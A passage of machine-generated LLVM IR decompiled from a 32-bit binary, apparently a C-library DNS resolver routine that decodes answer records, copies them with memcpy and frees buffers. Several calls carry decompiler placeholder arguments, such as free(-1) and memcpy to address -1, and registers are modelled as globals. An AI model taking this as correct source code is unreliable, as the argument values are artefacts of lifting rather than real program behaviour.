  %v5_804c23059 = sub i32 0, %v4_804c23058
  %v13_804c23063 = and i32 %v4_804c23058, %v5_804c23059
  %v14_804c23064 = icmp slt i32 %v13_804c23063, 0
  %v16_804c23066 = icmp slt i32 %v5_804c23059, 0
  %v2_804c23467 = icmp eq i1 %v16_804c23066, %v14_804c23064
  br i1 %v2_804c23467, label %dec_label_pc_804c236, label %dec_label_pc_804c221

dec_label_pc_804c211:                             ; preds = %dec_label_pc_804c201
  %v0_804c211 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c211, i32* %eax.global-to-local, align 4
  %v1_804c216 = inttoptr i32 %v0_804c211 to i32*
  store i32 4, i32* %v1_804c216, align 4
  br label %dec_label_pc_804c4ac

dec_label_pc_804c221:                             ; preds = %dec_label_pc_804c208, %dec_label_pc_804c221
  %v0_804c23869 = phi i32 [ %v1_804c22d, %dec_label_pc_804c221 ], [ %v1_804c170, %dec_label_pc_804c208 ]
  %v0_804c22168 = phi i32 [ %v0_804c225, %dec_label_pc_804c221 ], [ %v3_804c18a, %dec_label_pc_804c208 ]
  %v2_804c221 = add i32 %v0_804c23869, -4
  %v3_804c221 = inttoptr i32 %v2_804c221 to i32*
  store i32 %v0_804c22168, i32* %v3_804c221, align 4
  %v0_804c222 = load i32, i32* @eax, align 4
  %v2_804c222 = add i32 %v0_804c23869, -8
  %v3_804c222 = inttoptr i32 %v2_804c222 to i32*
  store i32 %v0_804c222, i32* %v3_804c222, align 4
  %v0_804c223 = load i32, i32* @esi, align 4
  %v2_804c223 = add i32 %v0_804c23869, -12
  %v3_804c223 = inttoptr i32 %v2_804c223 to i32*
  store i32 %v0_804c223, i32* %v3_804c223, align 4
  %v2_804c224 = add i32 %v0_804c23869, -16
  %v3_804c224 = inttoptr i32 %v2_804c224 to i32*
  store i32 %v2_804be06, i32* %v3_804c224, align 4
  %v0_804c225 = call i32 @__length_question()
  store i32 %v0_804c225, i32* @eax, align 4
  %v0_804c22a = load i32, i32* @ebx, align 4
  %v1_804c22a = add i32 %v0_804c22a, 1
  store i32 %v1_804c22a, i32* @ebx, align 4
  %v0_804c22b = load i32, i32* @esi, align 4
  %v2_804c22b = add i32 %v0_804c22b, %v0_804c225
  store i32 %v2_804c22b, i32* @esi, align 4
  %v0_804c22d = load i32, i32* @esp, align 4
  %v1_804c22d = add i32 %v0_804c22d, 16
  %v2_804c230 = add i32 %v0_804c22d, 116
  %v3_804c230 = inttoptr i32 %v2_804c230 to i32*
  %v4_804c230 = load i32, i32* %v3_804c230, align 4
  %v5_804c230 = sub i32 %v1_804c22a, %v4_804c230
  %v11_804c230 = xor i32 %v4_804c230, %v1_804c22a
  %v12_804c230 = xor i32 %v5_804c230, %v1_804c22a
  %v13_804c230 = and i32 %v12_804c230, %v11_804c230
  %v14_804c230 = icmp slt i32 %v13_804c230, 0
  %v16_804c230 = icmp slt i32 %v5_804c230, 0
  %v2_804c234 = icmp eq i1 %v16_804c230, %v14_804c230
  br i1 %v2_804c234, label %dec_label_pc_804c236, label %dec_label_pc_804c221

dec_label_pc_804c236:                             ; preds = %dec_label_pc_804c221, %dec_label_pc_804c208
  %v0_804c238.lcssa = phi i32 [ %v1_804c170, %dec_label_pc_804c208 ], [ %v1_804c22d, %dec_label_pc_804c221 ]
  store i32 0, i32* @ebx, align 4
  %v1_804c238 = add i32 %v0_804c238.lcssa, 27
  %v2_804c238 = inttoptr i32 %v1_804c238 to i8*
  store i8 1, i8* %v2_804c238, align 1
  %v0_804c366.pre = load i32, i32* @ebx, align 4
  %v1_804c366.pre = load i32, i32* @esp, align 4
  %v2_804c36670 = add i32 %v1_804c366.pre, 104
  %v3_804c36671 = inttoptr i32 %v2_804c36670 to i32*
  %v4_804c36672 = load i32, i32* %v3_804c36671, align 4
  %v5_804c36673 = sub i32 %v0_804c366.pre, %v4_804c36672
  %v11_804c36675 = xor i32 %v4_804c36672, %v0_804c366.pre
  %v12_804c36676 = xor i32 %v5_804c36673, %v0_804c366.pre
  %v13_804c36677 = and i32 %v12_804c36676, %v11_804c36675
  %v14_804c36678 = icmp slt i32 %v13_804c36677, 0
  %v16_804c36680 = icmp slt i32 %v5_804c36673, 0
  %v2_804c36a81 = icmp eq i1 %v16_804c36680, %v14_804c36678
  br i1 %v2_804c36a81, label %dec_label_pc_804c376, label %dec_label_pc_804c36c.lr.ph

dec_label_pc_804c36c.lr.ph:                       ; preds = %dec_label_pc_804c236
  %v0_804c36c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c36c

dec_label_pc_804c242:                             ; preds = %dec_label_pc_804c36c
  %v1_804c242 = add i32 %v0_804c24282, 116
  store i32 %v1_804c242, i32* %eax.global-to-local, align 4
  %v2_804c246 = add i32 %v0_804c24282, -4
  %v3_804c246 = inttoptr i32 %v2_804c246 to i32*
  store i32 %v1_804c242, i32* %v3_804c246, align 4
  %v3_804c247 = load i32, i32* %v3_804c36c, align 4
  %v5_804c247 = add i32 %v0_804c24282, -8
  %v6_804c247 = inttoptr i32 %v5_804c247 to i32*
  store i32 %v3_804c247, i32* %v6_804c247, align 4
  %v0_804c24b = load i32, i32* @esi, align 4
  %v2_804c24b = add i32 %v0_804c24282, -12
  %v3_804c24b = inttoptr i32 %v2_804c24b to i32*
  store i32 %v0_804c24b, i32* %v3_804c24b, align 4
  %v2_804c24c = add i32 %v0_804c24282, -16
  %v3_804c24c = inttoptr i32 %v2_804c24c to i32*
  store i32 %v2_804be06, i32* %v3_804c24c, align 4
  %v0_804c24d = call i32 @__decode_answer()
  store i32 %v0_804c24d, i32* @eax, align 4
  %v1_804c252 = load i32, i32* @esp, align 4
  %v2_804c252 = add i32 %v1_804c252, 68
  %v3_804c252 = inttoptr i32 %v2_804c252 to i32*
  store i32 %v0_804c24d, i32* %v3_804c252, align 4
  %v0_804c256 = load i32, i32* @esp, align 4
  %v1_804c256 = add i32 %v0_804c256, 16
  %v2_804c259 = icmp slt i32 %v0_804c24d, 0
  %v1_804c25b = icmp eq i1 %v2_804c259, false
  br i1 %v1_804c25b, label %dec_label_pc_804c275, label %dec_label_pc_804c25d

dec_label_pc_804c25d:                             ; preds = %dec_label_pc_804c242
  %v0_804c25d = load i32, i32* @ebx, align 4
  %v1_804c25d = icmp eq i32 %v0_804c25d, 0
  br i1 %v1_804c25d, label %dec_label_pc_804c408, label %dec_label_pc_804c265

dec_label_pc_804c265:                             ; preds = %dec_label_pc_804c25d
  %v1_804c265 = add i32 %v0_804c256, 100
  %v2_804c265 = inttoptr i32 %v1_804c265 to i32*
  %v3_804c265 = load i32, i32* %v2_804c265, align 4
  %v4_804c265 = icmp eq i32 %v3_804c265, 0
  br i1 %v4_804c265, label %dec_label_pc_804c408, label %dec_label_pc_804c376

dec_label_pc_804c275:                             ; preds = %dec_label_pc_804c242
  %v1_804c275 = add i32 %v0_804c256, 43
  %v2_804c275 = inttoptr i32 %v1_804c275 to i8*
  %v3_804c275 = load i8, i8* %v2_804c275, align 1
  %v4_804c275 = icmp eq i8 %v3_804c275, 0
  br i1 %v4_804c275, label %dec_label_pc_804c316, label %dec_label_pc_804c280

dec_label_pc_804c280:                             ; preds = %dec_label_pc_804c275
  %v0_804c280 = load i32, i32* @edi, align 4
  %v1_804c280 = add i32 %v0_804c280, 28
  %v2_804c280 = inttoptr i32 %v1_804c280 to i32*
  %v3_804c280 = load i32, i32* %v2_804c280, align 4
  store i32 %v3_804c280, i32* %eax.global-to-local, align 4
  %v2_804c283 = add i32 %v0_804c256, 160
  %v3_804c283 = inttoptr i32 %v2_804c283 to i32*
  store i32 %v3_804c280, i32* %v3_804c283, align 4
  %v0_804c28a = load i32, i32* @edi, align 4
  %v1_804c28a = add i32 %v0_804c28a, 32
  %v2_804c28a = inttoptr i32 %v1_804c28a to i32*
  %v3_804c28a = load i32, i32* %v2_804c28a, align 4
  store i32 %v3_804c28a, i32* %eax.global-to-local, align 4
  %v1_804c28d = load i32, i32* @esp, align 4
  %v2_804c28d = add i32 %v1_804c28d, 148
  %v3_804c28d = inttoptr i32 %v2_804c28d to i32*
  store i32 %v3_804c28a, i32* %v3_804c28d, align 4
  %v0_804c294 = load i32, i32* @edi, align 4
  %v1_804c294 = add i32 %v0_804c294, 36
  %v2_804c294 = inttoptr i32 %v1_804c294 to i32*
  %v3_804c294 = load i32, i32* %v2_804c294, align 4
  store i32 %v3_804c294, i32* %eax.global-to-local, align 4
  %v1_804c297 = load i32, i32* @esp, align 4
  %v2_804c297 = add i32 %v1_804c297, 152
  %v3_804c297 = inttoptr i32 %v2_804c297 to i32*
  store i32 %v3_804c294, i32* %v3_804c297, align 4
  %v0_804c29e = load i32, i32* @ecx, align 4
  %v1_804c29e = load i32, i32* @esp, align 4
  %v2_804c29e = add i32 %v1_804c29e, -4
  %v3_804c29e = inttoptr i32 %v2_804c29e to i32*
  store i32 %v0_804c29e, i32* %v3_804c29e, align 4
  %v1_804c29f = add i32 %v1_804c29e, -8
  %v2_804c29f = inttoptr i32 %v1_804c29f to i32*
  store i32 40, i32* %v2_804c29f, align 4
  %v1_804c2a1 = add i32 %v1_804c29e, 116
  store i32 %v1_804c2a1, i32* %edx.global-to-local, align 4
  %v2_804c2a5 = add i32 %v1_804c29e, -12
  %v3_804c2a5 = inttoptr i32 %v2_804c2a5 to i32*
  store i32 %v1_804c2a1, i32* %v3_804c2a5, align 4
  %v0_804c2a6 = load i32, i32* @edi, align 4
  %v2_804c2a6 = add i32 %v1_804c29e, -16
  %v3_804c2a6 = inttoptr i32 %v2_804c2a6 to i32*
  store i32 %v0_804c2a6, i32* %v3_804c2a6, align 4
  %v5_804c2a7 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804be94, i32 %v3_804bef3)
  store i32 %v5_804c2a7, i32* %eax.global-to-local, align 4
  %v0_804c2ac = load i32, i32* @edi, align 4
  %v1_804c2ac = add i32 %v0_804c2ac, 4
  %v2_804c2ac = inttoptr i32 %v1_804c2ac to i32*
  %v3_804c2ac = load i32, i32* %v2_804c2ac, align 4
  store i32 %v3_804c2ac, i32* %eax.global-to-local, align 4
  %v0_804c2af = load i32, i32* @esp, align 4
  %v1_804c2af = add i32 %v0_804c2af, 16
  %v9_804c2b2 = icmp eq i32 %v3_804c2ac, 24
  br i1 %v9_804c2b2, label %dec_label_pc_804c280.dec_label_pc_804c2d9_crit_edge, label %dec_label_pc_804c2b7

dec_label_pc_804c280.dec_label_pc_804c2d9_crit_edge: ; preds = %dec_label_pc_804c280
  %.pre25 = add i32 %v0_804c2af, 260
  %.pre26 = inttoptr i32 %.pre25 to i32*
  %v4_804c2d9.pre = load i32, i32* %.pre26, align 4
  br label %dec_label_pc_804c2d9

dec_label_pc_804c2b7:                             ; preds = %dec_label_pc_804c280
  %v1_804c2b7 = add i32 %v0_804c2ac, 28
  %v2_804c2b7 = inttoptr i32 %v1_804c2b7 to i32*
  %v3_804c2b7 = load i32, i32* %v2_804c2b7, align 4
  %v4_804c2b7 = icmp eq i32 %v3_804c2b7, 0
  br i1 %v4_804c2b7, label %dec_label_pc_804c376, label %dec_label_pc_804c2c1

dec_label_pc_804c2c1:                             ; preds = %dec_label_pc_804c2b7
  %v1_804c2c1 = add i32 %v0_804c2af, 260
  %v2_804c2c1 = inttoptr i32 %v1_804c2c1 to i32*
  %v3_804c2c1 = load i32, i32* %v2_804c2c1, align 4
  %v12_804c2c1 = icmp eq i32 %v3_804c2c1, 1
  br i1 %v12_804c2c1, label %dec_label_pc_804c2d9, label %dec_label_pc_804c2cb

dec_label_pc_804c2cb:                             ; preds = %dec_label_pc_804c2c1
  %v12_804c2cb = icmp eq i32 %v3_804c2c1, 28
  %v1_804c2d3 = icmp eq i1 %v12_804c2cb, false
  br i1 %v1_804c2d3, label %dec_label_pc_804c376, label %dec_label_pc_804c2d9

dec_label_pc_804c2d9:                             ; preds = %dec_label_pc_804c280.dec_label_pc_804c2d9_crit_edge, %dec_label_pc_804c2cb, %dec_label_pc_804c2c1
  %v4_804c2d9 = phi i32 [ %v4_804c2d9.pre, %dec_label_pc_804c280.dec_label_pc_804c2d9_crit_edge ], [ %v3_804c2c1, %dec_label_pc_804c2cb ], [ 1, %dec_label_pc_804c2c1 ]
  %v15_804c2d9 = icmp eq i32 %v3_804c2ac, %v4_804c2d9
  br i1 %v15_804c2d9, label %dec_label_pc_804c2ee, label %dec_label_pc_804c2e2

dec_label_pc_804c2e2:                             ; preds = %dec_label_pc_804c2d9
  %v1_804c2e5 = inttoptr i32 %v0_804c2ac to i32*
  %v2_804c2e5 = load i32, i32* %v1_804c2e5, align 4
  %v5_804c2e5 = inttoptr i32 %v0_804c2af to i32*
  store i32 %v2_804c2e5, i32* %v5_804c2e5, align 4
  %v1_804c2e7 = call i32 @free(i32 -1)
  store i32 %v1_804c2e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c35e

dec_label_pc_804c2ee:                             ; preds = %dec_label_pc_804c2d9
  %v0_804c2ee = load i32, i32* @ebx, align 4
  %v1_804c2f0 = sub i32 -1, %v0_804c2ee
  store i32 %v1_804c2f0, i32* %eax.global-to-local, align 4
  %v2_804c2f2 = add i32 %v0_804c2af, 120
  %v3_804c2f2 = inttoptr i32 %v2_804c2f2 to i32*
  %v4_804c2f2 = load i32, i32* %v3_804c2f2, align 4
  %v5_804c2f2 = add i32 %v4_804c2f2, %v1_804c2f0
  store i32 %v5_804c2f2, i32* %eax.global-to-local, align 4
  %v2_804c2f6 = add i32 %v0_804c2ac, 36
  %v3_804c2f6 = inttoptr i32 %v2_804c2f6 to i32*
  store i32 %v5_804c2f2, i32* %v3_804c2f6, align 4
  %v0_804c2f9 = load i32, i32* @edi, align 4
  %v1_804c2f9 = add i32 %v0_804c2f9, 16
  %v2_804c2f9 = inttoptr i32 %v1_804c2f9 to i32*
  %v3_804c2f9 = load i32, i32* %v2_804c2f9, align 4
  %v1_804c2fc = add i32 %v3_804c2f9, 4
  store i32 %v1_804c2fc, i32* %eax.global-to-local, align 4
  %v2_804c2ff = add i32 %v0_804c2f9, 36
  %v3_804c2ff = inttoptr i32 %v2_804c2ff to i32*
  %v4_804c2ff = load i32, i32* %v3_804c2ff, align 4
  %v7_804c2ff = mul i32 %v4_804c2ff, %v1_804c2fc
  store i32 %v7_804c2ff, i32* %eax.global-to-local, align 4
  %v2_804c303 = add i32 %v0_804c2f9, 32
  %v3_804c303 = inttoptr i32 %v2_804c303 to i32*
  %v4_804c303 = load i32, i32* %v3_804c303, align 4
  %v6_804c306 = icmp ugt i32 %v7_804c2ff, %v4_804c303
  br i1 %v6_804c306, label %dec_label_pc_804c2ee.dec_label_pc_804c376.loopexit_crit_edge, label %dec_label_pc_804c308

dec_label_pc_804c2ee.dec_label_pc_804c376.loopexit_crit_edge: ; preds = %dec_label_pc_804c2ee
  %v0_804c376.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c376

dec_label_pc_804c308:                             ; preds = %dec_label_pc_804c2ee
  store i32 0, i32* %v3_804c2ff, align 4
  %v0_804c30f = load i32, i32* @esp, align 4
  %v1_804c30f = add i32 %v0_804c30f, 27
  %v2_804c30f = inttoptr i32 %v1_804c30f to i8*
  store i8 0, i8* %v2_804c30f, align 1
  %v1_804c361.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c361

dec_label_pc_804c316:                             ; preds = %dec_label_pc_804c275
  %v1_804c319 = add i32 %v0_804c256, 132
  %v2_804c319 = inttoptr i32 %v1_804c319 to i32*
  %v3_804c319 = load i32, i32* %v2_804c319, align 4
  %v6_804c319 = inttoptr i32 %v0_804c256 to i32*
  store i32 %v3_804c319, i32* %v6_804c319, align 4
  %v1_804c320 = call i32 @free(i32 -1)
  store i32 %v1_804c320, i32* %eax.global-to-local, align 4
  %v0_804c325 = load i32, i32* @esp, align 4
  %v1_804c325 = add i32 %v0_804c325, 16
  %v1_804c328 = add i32 %v0_804c325, 260
  %v2_804c328 = inttoptr i32 %v1_804c328 to i32*
  %v3_804c328 = load i32, i32* %v2_804c328, align 4
  store i32 %v3_804c328, i32* %eax.global-to-local, align 4
  %v1_804c32f = add i32 %v0_804c325, 136
  %v2_804c32f = inttoptr i32 %v1_804c32f to i32*
  %v3_804c32f = load i32, i32* %v2_804c32f, align 4
  %v15_804c32f = icmp eq i32 %v3_804c32f, %v3_804c328
  %v1_804c333 = icmp eq i1 %v15_804c32f, false
  br i1 %v1_804c333, label %dec_label_pc_804c361, label %dec_label_pc_804c335

dec_label_pc_804c335:                             ; preds = %dec_label_pc_804c316
  %v0_804c335 = load i32, i32* @edi, align 4
  %v1_804c335 = add i32 %v0_804c335, 16
  %v2_804c335 = inttoptr i32 %v1_804c335 to i32*
  %v3_804c335 = load i32, i32* %v2_804c335, align 4
  store i32 %v3_804c335, i32* %eax.global-to-local, align 4
  %v2_804c338 = add i32 %v0_804c325, 148
  %v3_804c338 = inttoptr i32 %v2_804c338 to i32*
  %v4_804c338 = load i32, i32* %v3_804c338, align 4
  %v15_804c338 = icmp eq i32 %v3_804c335, %v4_804c338
  %v1_804c33f = icmp eq i1 %v15_804c338, false
  br i1 %v1_804c33f, label %dec_label_pc_804c3fb, label %dec_label_pc_804c345

dec_label_pc_804c345:                             ; preds = %dec_label_pc_804c335
  %v0_804c345 = load i32, i32* @edx, align 4
  %v2_804c345 = add i32 %v0_804c325, 12
  %v3_804c345 = inttoptr i32 %v2_804c345 to i32*
  store i32 %v0_804c345, i32* %v3_804c345, align 4
  %v0_804c346 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c346 = add i32 %v0_804c325, 8
  %v3_804c346 = inttoptr i32 %v2_804c346 to i32*
  store i32 %v0_804c346, i32* %v3_804c346, align 4
  %v1_804c347 = add i32 %v0_804c325, 152
  %v2_804c347 = inttoptr i32 %v1_804c347 to i32*
  %v3_804c347 = load i32, i32* %v2_804c347, align 4
  %v5_804c347 = add i32 %v0_804c325, 4
  %v6_804c347 = inttoptr i32 %v5_804c347 to i32*
  store i32 %v3_804c347, i32* %v6_804c347, align 4
  %v0_804c34e = load i32, i32* %eax.global-to-local, align 4
  %v1_804c34e = load i32, i32* @edi, align 4
  %v2_804c34e = add i32 %v1_804c34e, 36
  %v3_804c34e = inttoptr i32 %v2_804c34e to i32*
  %v4_804c34e = load i32, i32* %v3_804c34e, align 4
  %v7_804c34e = mul i32 %v4_804c34e, %v0_804c34e
  store i32 %v7_804c34e, i32* %eax.global-to-local, align 4
  %v2_804c352 = add i32 %v1_804c34e, 28
  %v3_804c352 = inttoptr i32 %v2_804c352 to i32*
  %v4_804c352 = load i32, i32* %v3_804c352, align 4
  %v5_804c352 = add i32 %v4_804c352, %v7_804c34e
  store i32 %v5_804c352, i32* %eax.global-to-local, align 4
  %v3_804c355 = inttoptr i32 %v0_804c325 to i32*
  store i32 %v5_804c352, i32* %v3_804c355, align 4
  %v5_804c356 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804be94, i32 %v3_804bef3)
  store i32 %v5_804c356, i32* %eax.global-to-local, align 4
  %v0_804c35b = load i32, i32* @edi, align 4
  %v1_804c35b = add i32 %v0_804c35b, 36
  %v2_804c35b = inttoptr i32 %v1_804c35b to i32*
  %v3_804c35b = load i32, i32* %v2_804c35b, align 4
  %v4_804c35b = add i32 %v3_804c35b, 1
  store i32 %v4_804c35b, i32* %v2_804c35b, align 4
  br label %dec_label_pc_804c35e

dec_label_pc_804c35e:                             ; preds = %dec_label_pc_804c2e2, %dec_label_pc_804c345
  %v0_804c35e = load i32, i32* @esp, align 4
  %v1_804c35e = add i32 %v0_804c35e, 16
  br label %dec_label_pc_804c361

dec_label_pc_804c361:                             ; preds = %dec_label_pc_804c316, %dec_label_pc_804c308, %dec_label_pc_804c35e
  %v1_804c361 = phi i32 [ %v1_804c325, %dec_label_pc_804c316 ], [ %v1_804c361.pre, %dec_label_pc_804c308 ], [ %v1_804c35e, %dec_label_pc_804c35e ]
  %v0_804c361 = load i32, i32* @esi, align 4
  %v2_804c361 = add i32 %v1_804c361, 52
  %v3_804c361 = inttoptr i32 %v2_804c361 to i32*
  %v4_804c361 = load i32, i32* %v3_804c361, align 4
  %v5_804c361 = add i32 %v4_804c361, %v0_804c361
  store i32 %v5_804c361, i32* @esi, align 4
  %v0_804c365 = load i32, i32* @ebx, align 4
  %v1_804c365 = add i32 %v0_804c365, 1
  store i32 %v1_804c365, i32* @ebx, align 4
  %v2_804c366 = add i32 %v1_804c361, 104
  %v3_804c366 = inttoptr i32 %v2_804c366 to i32*
  %v4_804c366 = load i32, i32* %v3_804c366, align 4
  %v5_804c366 = sub i32 %v1_804c365, %v4_804c366
  %v11_804c366 = xor i32 %v4_804c366, %v1_804c365
  %v12_804c366 = xor i32 %v5_804c366, %v1_804c365
  %v13_804c366 = and i32 %v12_804c366, %v11_804c366
  %v14_804c366 = icmp slt i32 %v13_804c366, 0
  %v16_804c366 = icmp slt i32 %v5_804c366, 0
  %v2_804c36a = icmp eq i1 %v16_804c366, %v14_804c366
  br i1 %v2_804c36a, label %dec_label_pc_804c376, label %dec_label_pc_804c36c

dec_label_pc_804c36c:                             ; preds = %dec_label_pc_804c36c.lr.ph, %dec_label_pc_804c361
  %v0_804c36c = phi i32 [ %v0_804c36c.pre, %dec_label_pc_804c36c.lr.ph ], [ %v5_804c361, %dec_label_pc_804c361 ]
  %v0_804c24282 = phi i32 [ %v1_804c366.pre, %dec_label_pc_804c36c.lr.ph ], [ %v1_804c361, %dec_label_pc_804c361 ]
  %v2_804c36c = add i32 %v0_804c24282, 16
  %v3_804c36c = inttoptr i32 %v2_804c36c to i32*
  %v4_804c36c = load i32, i32* %v3_804c36c, align 4
  %v5_804c36c = sub i32 %v0_804c36c, %v4_804c36c
  %v11_804c36c = xor i32 %v4_804c36c, %v0_804c36c
  %v12_804c36c = xor i32 %v5_804c36c, %v0_804c36c
  %v13_804c36c = and i32 %v12_804c36c, %v11_804c36c
  %v14_804c36c = icmp slt i32 %v13_804c36c, 0
  %v16_804c36c = icmp slt i32 %v5_804c36c, 0
  %v2_804c370 = icmp eq i1 %v16_804c36c, %v14_804c36c
  br i1 %v2_804c370, label %dec_label_pc_804c376, label %dec_label_pc_804c242

dec_label_pc_804c376:                             ; preds = %dec_label_pc_804c265, %dec_label_pc_804c236, %dec_label_pc_804c361, %dec_label_pc_804c2b7, %dec_label_pc_804c2cb, %dec_label_pc_804c36c, %dec_label_pc_804c2ee.dec_label_pc_804c376.loopexit_crit_edge
  %v0_804c376 = phi i32 [ %v0_804c376.pre.pre, %dec_label_pc_804c2ee.dec_label_pc_804c376.loopexit_crit_edge ], [ %v1_804c366.pre, %dec_label_pc_804c236 ], [ %v1_804c361, %dec_label_pc_804c361 ], [ %v1_804c2af, %dec_label_pc_804c2b7 ], [ %v1_804c2af, %dec_label_pc_804c2cb ], [ %v0_804c24282, %dec_label_pc_804c36c ], [ %v1_804c256, %dec_label_pc_804c265 ]
  %v1_804c379 = add i32 %v0_804c376, 20
  %v2_804c379 = inttoptr i32 %v1_804c379 to i32*
  %v3_804c379 = load i32, i32* %v2_804c379, align 4
  %v5_804c379 = add i32 %v0_804c376, -16
  %v6_804c379 = inttoptr i32 %v5_804c379 to i32*
  store i32 %v3_804c379, i32* %v6_804c379, align 4
  %v1_804c37d = call i32 @__libc_close(i32 -1)
  store i32 %v1_804c37d, i32* %eax.global-to-local, align 4
  %v0_804c382 = load i32, i32* @esp, align 4
  %v1_804c385 = add i32 %v0_804c382, 272
  %v2_804c385 = inttoptr i32 %v1_804c385 to i32*
  %v3_804c385 = load i32, i32* %v2_804c385, align 4
  %v4_804c385 = icmp eq i32 %v3_804c385, 0
  br i1 %v4_804c385, label %dec_label_pc_804c39a, label %dec_label_pc_804c38f

dec_label_pc_804c38f:                             ; preds = %dec_label_pc_804c376
  store i32 %v3_804c385, i32* %edx.global-to-local, align 4
  %v2_804c396 = inttoptr i32 %v3_804c385 to i32*
  store i32 %v2_804be06, i32* %v2_804c396, align 4
  %v0_804c3a6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c3a6

dec_label_pc_804c39a:                             ; preds = %dec_label_pc_804c376
  %v3_804c39d = inttoptr i32 %v0_804c382 to i32*
  store i32 %v2_804be06, i32* %v3_804c39d, align 4
  %v1_804c39e = call i32 @free(i32 -1)
  store i32 %v1_804c39e, i32* %eax.global-to-local, align 4
  %v0_804c3a3 = load i32, i32* @esp, align 4
  %v1_804c3a3 = add i32 %v0_804c3a3, 16
  br label %dec_label_pc_804c3a6

dec_label_pc_804c3a6:                             ; preds = %dec_label_pc_804c38f, %dec_label_pc_804c39a
  %v0_804c3a6 = phi i32 [ %v0_804c3a6.pre, %dec_label_pc_804c38f ], [ %v1_804c3a3, %dec_label_pc_804c39a ]
  %v1_804c3a9 = add i32 %v0_804c3a6, 12
  %v2_804c3a9 = inttoptr i32 %v1_804c3a9 to i32*
  %v3_804c3a9 = load i32, i32* %v2_804c3a9, align 4
  %v5_804c3a9 = add i32 %v0_804c3a6, -16
  %v6_804c3a9 = inttoptr i32 %v5_804c3a9 to i32*
  store i32 %v3_804c3a9, i32* %v6_804c3a9, align 4
  %v1_804c3ad = call i32 @free(i32 -1)
  store i32 %v1_804c3ad, i32* @eax, align 4
  %v0_804c3b2 = load i32, i32* @esp, align 4
  %v1_804c3b5 = add i32 %v0_804c3b2, 8
  %v2_804c3b5 = inttoptr i32 %v1_804c3b5 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c3b5, align 4
  %v1_804c3ba = add i32 %v0_804c3b2, 4
  %v2_804c3ba = inttoptr i32 %v1_804c3ba to i32*
  store i32 134526403, i32* %v2_804c3ba, align 4
  %v1_804c3bf = add i32 %v0_804c3b2, 200
  store i32 %v1_804c3bf, i32* %ebx.global-to-local, align 4
  %v3_804c3c6 = inttoptr i32 %v0_804c3b2 to i32*
  store i32 %v1_804c3bf, i32* %v3_804c3c6, align 4
  %v2_804c3c7 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804c3c7, i32* %eax.global-to-local, align 4
  %v0_804c3cc = load i32, i32* @esp, align 4
  %v1_804c3cc = inttoptr i32 %v0_804c3cc to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c3cc, align 4
  %v1_804c3d3 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c3d3, i32* %eax.global-to-local, align 4
  %v0_804c3d8 = load i32, i32* @esp, align 4
  %v1_804c3d8 = add i32 %v0_804c3d8, 56
  %v2_804c3d8 = inttoptr i32 %v1_804c3d8 to i32*
  %v3_804c3d8 = load i32, i32* %v2_804c3d8, align 4
  store i32 %v3_804c3d8, i32* @eax, align 4
  %v1_804c3dc = add i32 %v0_804c3d8, 72
  %v2_804c3dc = inttoptr i32 %v1_804c3dc to i32*
  %v3_804c3dc = load i32, i32* %v2_804c3dc, align 4
  store i32 %v3_804c3dc, i32* %edx.global-to-local, align 4
  %v1_804c3e0 = inttoptr i32 %v0_804c3d8 to i32*
  %v3_804c3e0 = add i32 %v0_804c3d8, 4
  %v1_804c3e1 = inttoptr i32 %v3_804c3e0 to i32*
  store i32 1, i32* %v1_804c3e1, align 4
  %v0_804c3e4 = load i32, i32* @eax, align 4
  %v1_804c3e4 = sext i32 %v0_804c3e4 to i64
  store i64 %v1_804c3e4, i64* @global_var_8052540.85, align 64
  %v0_804c3e9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c3e9 = trunc i32 %v0_804c3e9 to i16
  store i16 %v1_804c3e9, i16* @global_var_805215c.86, align 4
  %v0_804c3f0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c3f0, i32* %v1_804c3e0, align 4
  %v2_804c3f1 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804c3f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c532

dec_label_pc_804c3fb:                             ; preds = %dec_label_pc_804c335
  %v1_804c3fe = inttoptr i32 %v0_804c335 to i32*
  %v2_804c3fe = load i32, i32* %v1_804c3fe, align 4
  %v5_804c3fe = inttoptr i32 %v0_804c325 to i32*
  store i32 %v2_804c3fe, i32* %v5_804c3fe, align 4
  %v1_804c400 = call i32 @free(i32 -1)
  store i32 %v1_804c400, i32* @eax, align 4
  %v0_804c405 = load i32, i32* @esp, align 4
  %v1_804c405 = add i32 %v0_804c405, 16
  br label %dec_label_pc_804c408

dec_label_pc_804c408:                             ; preds = %dec_label_pc_804c13a, %dec_label_pc_804c265, %dec_label_pc_804c25d, %dec_label_pc_804c1f9, %dec_label_pc_804c17f, %dec_label_pc_804c15b, %dec_label_pc_804c3fb
  %v1_804c40f = phi i32 [ %v1_804c14f, %dec_label_pc_804c13a ], [ %v1_804c256, %dec_label_pc_804c265 ], [ %v1_804c256, %dec_label_pc_804c25d ], [ %v1_804c170, %dec_label_pc_804c1f9 ], [ %v1_804c170, %dec_label_pc_804c17f ], [ %v1_804c170, %dec_label_pc_804c15b ], [ %v1_804c405, %dec_label_pc_804c3fb ]
  %v1_804c408 = add i32 %v1_804c40f, 51
  %v2_804c408 = inttoptr i32 %v1_804c408 to i8*
  %v3_804c408 = load i8, i8* %v2_804c408, align 1
  %v4_804c408 = icmp eq i8 %v3_804c408, 0
  %v1_804c40d = icmp eq i1 %v4_804c408, false
  br i1 %v1_804c40d, label %dec_label_pc_804c453, label %dec_label_pc_804c40f

dec_label_pc_804c40f:                             ; preds = %dec_label_pc_804c408
  %v0_804c40f = load i32, i32* @ecx, align 4
  %v2_804c40f = add i32 %v1_804c40f, -4
  %v3_804c40f = inttoptr i32 %v2_804c40f to i32*
  store i32 %v0_804c40f, i32* %v3_804c40f, align 4
